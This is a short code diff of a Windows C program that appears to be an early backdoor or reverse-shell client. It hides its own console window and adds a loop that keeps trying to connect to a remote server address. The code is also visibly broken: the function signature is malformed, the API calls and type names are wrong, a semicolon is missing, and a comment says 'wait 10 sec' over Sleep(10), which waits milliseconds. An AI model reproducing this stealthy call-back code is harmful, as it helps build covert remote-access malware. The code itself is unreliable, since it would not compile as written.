@@ -14,8 +14,8 @@ int sock;
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE, hPrev, LPSTR, lpCmdLine, int nCmdShow) {
     HWND stealth; //window handle
-    AllocConsole(); 
-    stealth.FindWindowA("ConsoleWindowClass", NULL); //from winuser.h, retrives handle to top level window
+    AllocConsole(); //creates a console
+    stealth.FindWindowA("ConsoleWindowClass", NULL); //retrives handle to top level window
     ShowWindow(stealth, 0); //0 is basically hiding the window
 
     struct sockaddr_in ServAddr;
@@ -31,10 +31,16 @@ int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE, hPrev, LPSTR, lpCmdLine, in
         exit(1);
     }
     
-    sock = socket(AF_INET, SOCK_STREAM, 0); //Params: use ipv4, use tcp
+    sock = socket(AF_INET, SOCK_STREAM, 0); //use ipv4, use tcp for socket
 
+    //setup ServAddr
     memset(&ServAddr, 0, size_of(ServAddr)); //sets ServAddr to all 0
     ServAddr.sin_family = AF_INET //ipv4
     ServAddr.sin_addr.s_addr = inet_addr(ServIP); //setip
     ServAddr.sin_port = htons(ServPort); //set port
+
+    //try to connect every 10 sec
+    while(connect(sock, (struct sock addr *) &ServAddr, sizeof(ServAddr)) != 0) {
+        Sleep(10); //wait 10 sec
+    }
 }
